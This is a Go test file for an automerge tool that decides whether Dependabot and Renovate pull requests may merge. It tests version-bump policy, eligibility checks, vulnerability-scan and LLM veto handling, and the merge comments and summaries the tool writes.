			wantReason: "allowed digest update",
		},
		{
			name:       "update requirement in group title",
			title:      "Update rubocop requirement from 1.91.0 to 1.92.0 in the rubocop-dependencies group",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "update requirement in title without group",
			title:      "Update rubocop requirement from 1.91.0 to 1.92.0",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "group update title with empty body",
			title:      "Bump the rust group with 2 updates",
			disallowed: true,
			wantReason: "unrecognized title format or no updates found in body",
		},
		{
			name:  "group update with 2 non-breaking updates and release notes details",
			title: "Bump the actions group with 2 updates",
			body: "Bumps the actions group with 2 updates: [actions/upload-artifact](https://github.com/actions/upload-artifact) and [astral-sh/setup-uv](https://github.com/astral-sh/setup-uv).\n\n" +
				"Updates `actions/upload-artifact` from 7.0.1 to 7.0.2\n" +
				"<details>\n<summary>Release notes</summary>\nUpdates foo from 1.0.0 to 2.0.0 in changelog\n</details>\n\n" +
				"Updates `astral-sh/setup-uv` from 10.2.0 to 10.3.0\n" +
				"<details>\n<summary>Release notes</summary>\n</details>\n\n" +
				"[//]: # (dependabot-automerge-start)\n",
			disallowed: false,
			wantReason: "non-breaking updates (2 packages)",
		},
		{
			name:  "group update with a major bump in one package",
			title: "Bump the nextjs group with 2 updates",
			body: "Bumps the nextjs group with 2 updates: [eslint-config-next](https://github.com/vercel/next.js) and [next](https://github.com/vercel/next.js).\n\n" +
				"Updates `eslint-config-next` from 16.3.8 to 16.4.1\n\n" +
				"Updates `next` from 15.5.24 to 16.4.1\n",
			disallowed: true,
			wantReason: "major update for next (15.5.24 -> 16.4.1)",
		},
		{
			name:  "group update with updated link format",
			title: "Bump the grouped-dependencies group with 2 updates",
			body: "Updated [Swashbuckle.AspNetCore](https://github.com/domaindrivendev/Swashbuckle.AspNetCore) from 10.2.3 to 10.3.0.\n\n" +
				"Updated [xunit.runner.visualstudio](https://github.com/xunit/visualstudio.xunit) from 4.0.0 to 4.0.1.\n",
			disallowed: false,
			wantReason: "non-breaking updates (2 packages)",
		},
		{
			name:  "group update with count mismatch fails closed",
			title: "Bump the actions group with 3 updates",
			body: "Updates `actions/upload-artifact` from 7.0.1 to 7.0.2\n" +
				"Updates `astral-sh/setup-uv` from 10.2.0 to 10.3.0\n",
			disallowed: true,
			wantReason: "unrecognized body format: found 2 updates, expected 3",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			disallowed, reason := checkDependabotBump(tc.title, tc.body)
			if disallowed != tc.disallowed {
				t.Errorf("checkDependabotBump(%q) disallowed = %v, want %v", tc.title, disallowed, tc.disallowed)
			}
			if reason != tc.wantReason {
				t.Errorf("checkDependabotBump(%q) reason = %q, want %q", tc.title, reason, tc.wantReason)
			}
		})
	}
}

func TestCheckEligibility(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	basePR := PullRequest{
		Number:            1,
		Title:             "Update dependency",
		Body:              validRenovateBody,
		Author:            Author{Login: "renovate[bot]"},
		IsDraft:           false,
		Mergeable:         "MERGEABLE",
		StatusCheckRollup: validChecks,
	}

	meta := workflowmeta.Metadata{}
	res := checkEligibility(basePR, defaultAllowedBots, meta)
	if !res.Eligible || res.Reason != "eligible for merge" {
		t.Fatalf("expected eligible for merge, got eligible=%v, reason=%q", res.Eligible, res.Reason)
	}

	dependabot0xPR := basePR
	dependabot0xPR.Author.Login = "dependabot[bot]"
	dependabot0xPR.Title = "Bump golang.org/x/sys from 0.48.0 to 0.49.0"
	if res := checkEligibility(dependabot0xPR, defaultAllowedBots, meta); !res.Eligible {
		t.Fatalf("expected dependabot 0.x bump to be eligible, got reason=%q", res.Reason)
	}

	renovate0xPR := basePR
	renovate0xPR.Author.Login = "renovate[bot]"
	renovate0xPR.Body = "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [dprint/dprint-plugin-markdown](https://example.com) | minor | `0.24.0` → `0.26.0` |\n"
	if res := checkEligibility(renovate0xPR, defaultAllowedBots, meta); !res.Eligible {
		t.Fatalf("expected renovate 0.x bump to be eligible, got reason=%q", res.Reason)
	}

	tests := []struct {
		name        string
		modify      func(pr *PullRequest)
		wantReason  string
		wantBlocked bool
	}{
		{
			name: "unallowed author",
			modify: func(pr *PullRequest) {
				pr.Author.Login = "attacker[bot]"
			},
			wantReason:  `author "attacker[bot]" is not in allowed bots`,
			wantBlocked: false,
		},
		{
			name: "draft PR",
			modify: func(pr *PullRequest) {
				pr.IsDraft = true
			},
			wantReason:  "PR is a draft",
			wantBlocked: false,
		},
		{
			name: "conflicting PR",
			modify: func(pr *PullRequest) {
				pr.Mergeable = "CONFLICTING"
			},
			wantReason:  `GitHub MergeableState is "CONFLICTING" (details: https://github.com/kachick/workflows/blob/main/pkgs/automerge/docs/reasons/conflicting.md)`,
			wantBlocked: false,
		},
		{
			name: "unknown mergeable status PR",
			modify: func(pr *PullRequest) {
				pr.Mergeable = "UNKNOWN"
			},
			wantReason:  `GitHub MergeableState is "UNKNOWN" (details: https://github.com/kachick/workflows/blob/main/pkgs/automerge/docs/reasons/unknown-mergeable.md)`,
			wantBlocked: false,
		},
		{
			name: "empty checks",
			modify: func(pr *PullRequest) {
				pr.StatusCheckRollup = []StatusCheckItem{}
			},
			wantReason:  "no status checks found",
			wantBlocked: false,
		},
		{
			name: "in progress check",
			modify: func(pr *PullRequest) {
				pr.StatusCheckRollup = []StatusCheckItem{
					{Status: "IN_PROGRESS", Conclusion: ""},
				}
			},
			wantReason:  "status check is not completed (status: IN_PROGRESS)",
			wantBlocked: false,
		},
		{
			name: "failed check",
			modify: func(pr *PullRequest) {
				pr.StatusCheckRollup = []StatusCheckItem{
					{Status: "COMPLETED", Conclusion: "FAILURE"},
				}
			},
			wantReason:  `status check concluded with "FAILURE"`,
			wantBlocked: false,
		},
		{
			name: "dependabot major update",
			modify: func(pr *PullRequest) {
				pr.Author.Login = "dependabot[bot]"
				pr.Title = "Bump actions/checkout from 3.0.0 to 4.0.0"
			},
			wantReason:  "disallowed dependabot bump: major update (3.0.0 -> 4.0.0)",
			wantBlocked: true,
		},
		{
			name: "renovate major update",
			modify: func(pr *PullRequest) {
				pr.Author.Login = "renovate[bot]"
				pr.Body = "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [actions/checkout](https://example.com) | major | `3.0.0` -> `4.0.0` |\n"
			},
			wantReason:  "disallowed renovate bump: major update (3.0.0 -> 4.0.0)",
			wantBlocked: true,
		},
		{
			name: "renovate unrecognized body",
			modify: func(pr *PullRequest) {
				pr.Author.Login = "renovate[bot]"
				pr.Body = "Unrecognized body without table"
			},
			wantReason:  "disallowed renovate bump: unrecognized body format or no update rows found",
			wantBlocked: true,
		},
		{
			name: "veto label exists",
			modify: func(pr *PullRequest) {
				pr.Labels = []Label{{Name: vetoLabelName}}
			},
			wantReason:  fmt.Sprintf("PR has %q label", vetoLabelName),
			wantBlocked: false,
		},
		{
			name: "blocked label exists",
			modify: func(pr *PullRequest) {
				pr.Labels = []Label{{Name: blockedLabelName}}
			},
			wantReason:  fmt.Sprintf("PR has %q label", blockedLabelName),
			wantBlocked: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pr := basePR
			tc.modify(&pr)
			res := checkEligibility(pr, defaultAllowedBots, meta)
			if res.Eligible {
				t.Fatalf("expected PR to be ineligible")
			}
			if res.Reason != tc.wantReason {
				t.Errorf("checkEligibility() reason = %q, want %q", res.Reason, tc.wantReason)
			}
			if res.Blocked != tc.wantBlocked {
				t.Errorf("checkEligibility() blocked = %v, want %v", res.Blocked, tc.wantBlocked)
			}
		})
	}
}

func TestCheckRenovateBump(t *testing.T) {
	tests := []struct {
		name       string
		body       string
		disallowed bool
		wantReason string
	}{
		{
			name:       "minor update with arrow",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [dprint/dprint-plugin-markdown](https://example.com) | minor | `0.24.0` → `0.26.0` |\n",
			disallowed: false,
			wantReason: "allowed 0.x or initial stable release",
		},
		{
			name:       "minor update with ascii arrow",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [kachick/renovate-config-dprint](https://example.com) | minor | `1.1.0` -> `1.3.0` |\n",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "patch update",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [dprint/dprint-plugin-json](https://example.com) | patch | `0.25.0` → `0.25.2` |\n",
			disallowed: false,
			wantReason: "allowed 0.x or initial stable release",
		},
		{
			name:       "major update",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [actions/checkout](https://example.com) | major | `3.0.0` → `4.0.0` |\n",
			disallowed: true,
			wantReason: "major update (3.0.0 -> 4.0.0)",
		},
		{
			name:       "0.x to 1.x update",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | major | `0.9.0` → `1.0.0` |\n",
			disallowed: false,
			wantReason: "allowed 0.x or initial stable release",
		},
		{
			name:       "0.x to 2.x update",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | major | `0.1.0` → `2.0.0` |\n",
			disallowed: true,
			wantReason: "major update (0.1.0 -> 2.0.0)",
		},
		{
			name:       "cachix major update",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [cachix/cachix-action](https://example.com) | major | `14` → `15` |\n",
			disallowed: true,
			wantReason: "major update (14 -> 15)",
		},
		{
			name:       "container digest update with type column",
			body:       "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| ghcr.io/kachick/ubuntu-26.04-nix-systemd | final | digest | `99230df` → `8297d9b` |\n",
			disallowed: false,
			wantReason: "allowed digest update",
		},
		{
			name:       "unlinked package name",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| foo | patch | `1.0.0` -> `1.0.1` |\n",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "group update all allowed",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | minor | `1.0.0` -> `1.1.0` |\n| [bar](https://example.com) | patch | `2.0.0` -> `2.0.1` |\n",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "group update with one major disallowed",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | minor | `1.0.0` -> `1.1.0` |\n| [bar](https://example.com) | major | `1.0.0` -> `2.0.0` |\n",
			disallowed: true,
			wantReason: "major update (1.0.0 -> 2.0.0)",
		},
		{
			name:       "group update with one unrecognized row fails closed",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | minor | `1.0.0` -> `1.1.0` |\n| [bar](https://example.com) | replacement |Replaced by baz |\n",
			disallowed: true,
			wantReason: "unrecognized body format or no update rows found",
		},
		{
			name:       "ignores tables in release notes section",
			body:       "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | patch | `1.0.0` -> `1.0.1` |\n\n---\n\n### Release Notes\n\n<details>\n| Other | Update | Change |\n|---|---|---|\n| [broken](https://example.com) | major | `1.0.0` -> `9.0.0` |\n</details>\n",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "unrecognized body format",
			body:       "Lock file maintenance updates",
			disallowed: true,
			wantReason: "unrecognized body format or no update rows found",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			disallowed, reason := checkRenovateBump(tc.body)
			if disallowed != tc.disallowed {
				t.Errorf("checkRenovateBump() disallowed = %v, want %v", disallowed, tc.disallowed)
			}
			if reason != tc.wantReason {
				t.Errorf("checkRenovateBump() reason = %q, want %q", reason, tc.wantReason)
			}
		})
	}
}

func TestExtractBaseTreeAndApplyPatch(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("skipping test: git executable not found in PATH")
	}
	if _, err := exec.LookPath("tar"); err != nil {
		t.Skip("skipping test: tar executable not found in PATH")
	}

	ctx := context.Background()
	repoDir := t.TempDir()
	destDir := t.TempDir()

	// Initialize a disposable git repository so tests never read or write host repository state
	initCmd := exec.CommandContext(ctx, "git", "-C", repoDir, "init")
	if out, err := initCmd.CombinedOutput(); err != nil {
		t.Fatalf("git init failed (%v): %s", err, string(out))
	}

	samplePath := filepath.Join(repoDir, "sample.txt")
	if err := os.WriteFile(samplePath, []byte("original content\n"), 0o600); err != nil {
		t.Fatalf("failed to write sample file: %v", err)
	}

	addCmd := exec.CommandContext(ctx, "git", "-C", repoDir, "add", "sample.txt")
	if out, err := addCmd.CombinedOutput(); err != nil {
		t.Fatalf("git add failed (%v): %s", err, string(out))
	}

	commitCmd := exec.CommandContext(ctx, "git", "-C", repoDir, "commit", "-m", "Initial commit")
	commitCmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=Test Runner",
		"GIT_AUTHOR_EMAIL=test@example.com",
		"GIT_COMMITTER_NAME=Test Runner",
		"GIT_COMMITTER_EMAIL=test@example.com",
	)
	if out, err := commitCmd.CombinedOutput(); err != nil {
		t.Fatalf("git commit failed (%v): %s", err, string(out))
	}

	if err := extractBaseTree(ctx, repoDir, destDir); err != nil {
		t.Fatalf("extractBaseTree() failed: %v", err)
	}

	extractedPath := filepath.Join(destDir, "sample.txt")
	content, err := os.ReadFile(extractedPath)
	if err != nil {
		t.Fatalf("expected sample.txt in extracted tree: %v", err)
	}
	if string(content) != "original content\n" {
		t.Errorf("expected %q, got %q", "original content\n", string(content))
	}

	// Verify empty diff apply succeeds without modifying files
	if err := applyPatch(ctx, destDir, ""); err != nil {
		t.Errorf("applyPatch() with empty diff failed: %v", err)
	}

	// Verify non-empty diff apply modifies the target file
	patch := "diff --git a/sample.txt b/sample.txt\n--- a/sample.txt\n+++ b/sample.txt\n@@ -1 +1 @@\n-original content\n+patched content\n"
	if err := applyPatch(ctx, destDir, patch); err != nil {
		t.Fatalf("applyPatch() with patch failed: %v", err)
	}

	patchedContent, err := os.ReadFile(extractedPath)
	if err != nil {
		t.Fatalf("failed to read patched sample.txt: %v", err)
	}
	if string(patchedContent) != "patched content\n" {
		t.Errorf("expected %q, got %q", "patched content\n", string(patchedContent))
	}
}

func TestResolveOSVConfigIgnoresPatchedTree(t *testing.T) {
	baseDir := t.TempDir()
	patchedDir := t.TempDir()

	// Untrusted PR adds osv-scanner.toml in patchedDir, while baseDir has none.
	untrustedConfig := filepath.Join(patchedDir, "osv-scanner.toml")
	if err := os.WriteFile(untrustedConfig, []byte("[[IgnoredVulns]]\nid = \"GHSA-0000-0000-0000\"\n"), 0o600); err != nil {
		t.Fatalf("failed to write untrusted config: %v", err)
	}

	resolved := resolveOSVConfig(baseDir)
	if resolved != "" {
		t.Fatalf("expected empty config when baseDir has no osv-scanner.toml, got %q", resolved)
	}

	argsWithoutBaseConfig := buildOSVScannerArgs(patchedDir, resolved)
	if !slices.Contains(argsWithoutBaseConfig, "--config="+os.DevNull) {
		t.Errorf("expected --config=%s when baseDir has no config, got %v", os.DevNull, argsWithoutBaseConfig)
	}
	if slices.Contains(argsWithoutBaseConfig, "--config="+untrustedConfig) {
		t.Errorf("must not use untrusted config from patchedDir: %v", argsWithoutBaseConfig)
	}

	// When baseDir has osv-scanner.toml, scanning patchedDir must still pass baseDir's config.
	trustedConfig := filepath.Join(baseDir, "osv-scanner.toml")
	if err := os.WriteFile(trustedConfig, []byte("# trusted\n"), 0o600); err != nil {
		t.Fatalf("failed to write trusted config: %v", err)
	}
	resolvedTrusted := resolveOSVConfig(baseDir)
	if resolvedTrusted != trustedConfig {
		t.Fatalf("expected %q, got %q", trustedConfig, resolvedTrusted)
	}

	argsWithBaseConfig := buildOSVScannerArgs(patchedDir, resolvedTrusted)
	if !slices.Contains(argsWithBaseConfig, "--config="+trustedConfig) {
		t.Errorf("expected --config=%s when scanning patchedDir, got %v", trustedConfig, argsWithBaseConfig)
	}
}

func TestExecuteVulnerabilityScan(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	prs := []PullRequest{
		{
			Number:            401,
			Title:             "Clean dependency update",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
		{
			Number:            402,
			Title:             "Vulnerable dependency update",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
		{
			Number:            403,
			Title:             "Scanner error update",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
	}

	runner := &mockRunner{
		prs: prs,
	}

	vulnScanner := &mockVulnScanner{
		scans: map[int]vetoDecision{
			401: {Veto: false, Reason: "no new vulnerabilities"},
			402: {Veto: true, Reason: "new vulnerability: GHSA-1234"},
		},
		scanErrs: map[int]error{
			403: errors.New("simulated scanner failure"),
		},
	}

	reviewer := &mockReviewer{}

	cfg := &Config{
		AllowedBots:  defaultAllowedBots,
		MergeMethod:  "squash",
		LLMVeto:      true,
		GeminiAPIKey: "dummy-key",
		GeminiModel:  "gemini-flash-latest",
		OSVScanner:   true,
	}

	err := execute(context.Background(), cfg, runner, reviewer, vulnScanner, workflowmeta.Metadata{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 401: pass (both vuln scan & reviewer pass -> merged)
	// 402: vetoed by vuln scan (reviewer must NOT be called -> tokens saved)
	// 403: scanner error -> skipped gracefully
	expectedMerged := []int{401}
	if !slices.Equal(runner.mergedPRs, expectedMerged) {
		t.Errorf("expected merged PRs %v, got %v", expectedMerged, runner.mergedPRs)
	}

	// Vulnerability scanner called for all 3
	expectedVulnCalls := []int{401, 402, 403}
	if !slices.Equal(vulnScanner.calledOn, expectedVulnCalls) {
		t.Errorf("expected vuln scanner called on %v, got %v", expectedVulnCalls, vulnScanner.calledOn)
	}

	// Reviewer must only be called for 401 (402 was vetoed prior, 403 failed prior)
	expectedReviewerCalls := []int{401}
	if !slices.Equal(reviewer.calledOn, expectedReviewerCalls) {
		t.Errorf("expected reviewer called on %v, got %v", expectedReviewerCalls, reviewer.calledOn)
	}

	// 402 must be labeled with vetoLabelName
	if !slices.Equal(runner.addedLabels[402], []string{vetoLabelName}) {
		t.Errorf("expected PR 402 to have veto label %v, got %v", []string{vetoLabelName}, runner.addedLabels[402])
	}
}

func TestParseConfigOSVScanner(t *testing.T) {
	// Default is true
	cfg, err := parseConfig([]string{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !cfg.OSVScanner {
		t.Errorf("expected OSVScanner default to be true")
	}

	// CLI flag overrides to false
	cfgDisabled, err := parseConfig([]string{"--osv-scanner=false"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfgDisabled.OSVScanner {
		t.Errorf("expected OSVScanner to be false with flag")
	}

	// Environment variable overrides
	t.Setenv("OSV_SCANNER", "false")
	cfgEnv, err := parseConfig([]string{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfgEnv.OSVScanner {
		t.Errorf("expected OSVScanner to be false from env")
	}
}

func TestExecutePostsMergeComment(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	runner := &mockRunner{
		prs: []PullRequest{
			{
				Number:            501,
				Title:             "Merged PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
			{
				Number:            502,
				Title:             "Failed merge PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
		},
		mergeErrOn: map[int]error{
			502: errors.New("simulated merge conflict"),
		},
	}

	cfg := &Config{
		AllowedBots: defaultAllowedBots,
		MergeMethod: "squash",
	}

	meta := workflowmeta.Metadata{
		ServerURL:          "https://github.com",
		Repository:         "kachick/workflows",
		RunID:              "99999",
		WorkflowRepository: "kachick/workflows",
		WorkflowSHA:        "sha123",
		WorkflowFilePath:   ".github/workflows/reusable-automerge.yml",
	}

	err := execute(context.Background(), cfg, runner, nil, nil, meta)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 501 should have merge comment posted
	if len(runner.comments[501]) != 1 {
		t.Fatalf("expected 1 comment on PR 501, got %v", runner.comments[501])
	}
	if !strings.Contains(runner.comments[501][0], "Merged automatically.") {
		t.Errorf("expected comment on 501 to contain 'Merged automatically.', got %q", runner.comments[501][0])
	}
	if !strings.Contains(runner.comments[501][0], "Requirements for automerge:") {
		t.Errorf("expected comment on 501 to contain evaluation steps, got %q", runner.comments[501][0])
	}
	if !strings.Contains(runner.comments[501][0], meta.ProvenanceText("Merged automatically")) {
		t.Errorf("expected comment on 501 to contain provenance link, got %q", runner.comments[501][0])
	}

	// 502 failed to merge, so comment must NOT be posted
	if len(runner.comments[502]) != 0 {
		t.Errorf("expected no comments on PR 502, got %v", runner.comments[502])
	}
}

func TestExecuteLabelsBlockedPR(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	runner := &mockRunner{
		prs: []PullRequest{
			{
				Number:            601,
				Title:             "Bump actions/checkout from 3.0.0 to 4.0.0", // Dependabot major -> blocked
				Author:            Author{Login: "dependabot[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
			{
				Number:            602,
				Title:             "Bump actions/checkout from 3.0.0 to 4.0.0", // Already blocked
				Author:            Author{Login: "dependabot[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
				Labels:            []Label{{Name: blockedLabelName}},
			},
			{
				Number:            603,
				Title:             "Draft PR", // Transient skip -> must NOT be labeled
				Author:            Author{Login: "dependabot[bot]"},
				IsDraft:           true,
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
		},
	}

	cfg := &Config{
		AllowedBots: defaultAllowedBots,
		MergeMethod: "squash",
	}

	meta := workflowmeta.Metadata{
		ServerURL:          "https://github.com",
		Repository:         "kachick/workflows",
		RunID:              "99999",
		WorkflowRepository: "kachick/workflows",
		WorkflowSHA:        "sha123",
		WorkflowFilePath:   ".github/workflows/reusable-automerge.yml",
	}

	err := execute(context.Background(), cfg, runner, nil, nil, meta)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 601 must be labeled with automerge:blocked and commented on
	if !slices.Equal(runner.addedLabels[601], []string{blockedLabelName}) {
		t.Errorf("expected PR 601 to have label %v, got %v", []string{blockedLabelName}, runner.addedLabels[601])
	}
	if !slices.Contains(runner.ensuredLabels, blockedLabelName) {
		t.Errorf("expected ensuredLabels to contain %q, got %v", blockedLabelName, runner.ensuredLabels)
	}
	if len(runner.comments[601]) != 1 {
		t.Fatalf("expected 1 comment on PR 601, got %v", runner.comments[601])
	}
	if !strings.Contains(runner.comments[601][0], blockedLabelName) {
		t.Errorf("expected comment on 601 to mention %q, got %q", blockedLabelName, runner.comments[601][0])
	}
	if !strings.Contains(runner.comments[601][0], "Inspected by [actions/runs/99999]") {
		t.Errorf("expected comment on 601 to include provenance link, got %q", runner.comments[601][0])
	}

	// 602 was already labeled, so AddLabelToPR and CommentPR must NOT be called again
	if len(runner.addedLabels[602]) != 0 {
		t.Errorf("expected no additional labels added to PR 602, got %v", runner.addedLabels[602])
	}
	if len(runner.comments[602]) != 0 {
		t.Errorf("expected no comments on PR 602, got %v", runner.comments[602])
	}

	// 603 is a draft, so it must NOT be labeled as blocked
	if len(runner.addedLabels[603]) != 0 {
		t.Errorf("expected no labels added to draft PR 603, got %v", runner.addedLabels[603])
	}
	if len(runner.comments[603]) != 0 {
		t.Errorf("expected no comments on draft PR 603, got %v", runner.comments[603])
	}
}

func TestBuildStepSummary(t *testing.T) {
	meta := workflowmeta.Metadata{
		ServerURL:  "https://github.com",
		Repository: "kachick/workflows",
	}

	t.Run("empty results", func(t *testing.T) {
		summary := buildStepSummary(nil, meta)
		expected := "### 🤖 Automerge Summary\n\nNo open pull requests found.\n"
		if summary != expected {
			t.Errorf("buildStepSummary() = %q, want %q", summary, expected)
		}
	})

	t.Run("formats rows correctly with links and escaped characters", func(t *testing.T) {
		results := []PRSummaryResult{
			{
				Number: 1,
				Title:  "Update foo | bar",
				Author: "renovate[bot]",
				Action: ActionMerged,
				Source: SourceMerge,
				Reason: "merged successfully",
			},
			{
				Number: 2,
				Title:  "Major update",
				Author: "dependabot[bot]",
				Action: ActionBlocked,
				Source: SourceVersionBump,
				Reason: "major update (1.0 -> 2.0)",
			},
			{
				Number: 3,
				Title:  "Vetoed update",
				Author: "app/renovate",
				Action: ActionVetoed,
				Source: SourceLLMVeto,
				Reason: "suspicious code",
			},
			{
				Number: 4,
				Title:  "Pending checks",
				Author: "samuebot[bot]",
				Action: ActionSkipped,
				Source: SourceCI,
				Reason: "status check pending",
			},
			{
				Number: 5,
				Title:  "Human PR",
				Author: "kachick",
				Action: ActionSkipped,
				Source: SourceAuthor,
				Reason: "not in allowed bots",
			},
		}

		summary := buildStepSummary(results, meta)
		if !strings.Contains(summary, "| [#1](https://github.com/kachick/workflows/pull/1) Update foo \\| bar | [renovate[bot]](https://github.com/apps/renovate) | ✅ Merged | Merge | merged successfully |") {
			t.Errorf("expected merged row in summary, got:\n%s", summary)
		}
		if !strings.Contains(summary, "| [#2](https://github.com/kachick/workflows/pull/2) Major update | [dependabot[bot]](https://github.com/apps/dependabot) | ⚠️ Blocked | Version bump policy | major update (1.0 -> 2.0) |") {
			t.Errorf("expected blocked row in summary, got:\n%s", summary)
		}
		if !strings.Contains(summary, "| [#3](https://github.com/kachick/workflows/pull/3) Vetoed update | [renovate[bot]](https://github.com/apps/renovate) | 🚫 Vetoed | LLM veto | suspicious code |") {
			t.Errorf("expected vetoed row in summary, got:\n%s", summary)
		}
		if !strings.Contains(summary, "| [#4](https://github.com/kachick/workflows/pull/4) Pending checks | [samuebot[bot]](https://github.com/apps/samuebot) | ⏭️ Skipped (transient) | CI | status check pending |") {
			t.Errorf("expected skipped row in summary, got:\n%s", summary)
		}
		if !strings.Contains(summary, "| [#5](https://github.com/kachick/workflows/pull/5) Human PR | @kachick | ⏭️ Skipped (transient) | Author | not in allowed bots |") {
			t.Errorf("expected human row in summary, got:\n%s", summary)
		}
		if !strings.Contains(summary, "#### Source Descriptions") {
			t.Errorf("expected source descriptions in summary, got:\n%s", summary)
		}
	})
}

func TestFormatEvaluationSteps(t *testing.T) {
	steps := []EvaluationStep{
		{Name: "Author is in allowed bots", Status: StepPassed, Details: "@dependabot[bot]"},
		{Name: "PR is not a draft", Status: StepPassed},
		{Name: "PR has no veto or block labels", Status: StepPassed},
		{Name: "GitHub mergeable state is clean", Status: StepPassed, Details: "MERGEABLE"},
		{Name: "All status checks completed successfully", Status: StepPassed, Details: "2/2 checks passed"},
		{Name: "Version bump policy", Status: StepFailed, Details: "disallowed dependabot bump: major update (1.0 -> 2.0)"},
		{Name: "Vulnerability scan (OSV-Scanner)", Status: StepSkipped},
		{Name: "LLM veto", Status: StepSkipped},
		{Name: "Merge PR", Status: StepSkipped},
	}

	formatted := formatEvaluationSteps(steps)
	expectedLines := []string{
		"Requirements for automerge:",
		"- :white_check_mark: Author is in allowed bots: @dependabot[bot]",
		"- :white_check_mark: PR is not a draft",
		"- :white_check_mark: PR has no veto or block labels",
		"- :white_check_mark: GitHub mergeable state is clean: MERGEABLE",
		"- :white_check_mark: All status checks completed successfully: 2/2 checks passed",
		"- :x: Version bump policy: disallowed dependabot bump: major update (1.0 -> 2.0)",
		"- :white_large_square: Vulnerability scan (OSV-Scanner)",
		"- :white_large_square: LLM veto",
		"- :white_large_square: Merge PR",
	}

	for _, line := range expectedLines {
		if !strings.Contains(formatted, line) {
			t.Errorf("formatEvaluationSteps() missing expected line %q, got:\n%s", line, formatted)
		}
	}
}

func TestFormatAuthor(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{input: "app/samuebot", expected: "[samuebot[bot]](https://github.com/apps/samuebot)"},
		{input: "samuebot[bot]", expected: "[samuebot[bot]](https://github.com/apps/samuebot)"},
		{input: "app/renovate", expected: "[renovate[bot]](https://github.com/apps/renovate)"},
		{input: "renovate[bot]", expected: "[renovate[bot]](https://github.com/apps/renovate)"},
		{input: "app/dependabot", expected: "[dependabot[bot]](https://github.com/apps/dependabot)"},
		{input: "dependabot[bot]", expected: "[dependabot[bot]](https://github.com/apps/dependabot)"},
		{input: "kachick", expected: "@kachick"},
		{input: "", expected: ""},
	}

	for _, tt := range tests {
		got := formatAuthor(tt.input)
		if got != tt.expected {
			t.Errorf("formatAuthor(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestExecuteWritesStepSummary(t *testing.T) {
	tmpDir := t.TempDir()
	summaryFile := filepath.Join(tmpDir, "step_summary.md")
	t.Setenv("GITHUB_STEP_SUMMARY", summaryFile)

	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	runner := &mockRunner{
		prs: []PullRequest{
			{
				Number:            701,
				Title:             "Merged PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
		},
	}

	cfg := &Config{
		AllowedBots: defaultAllowedBots,
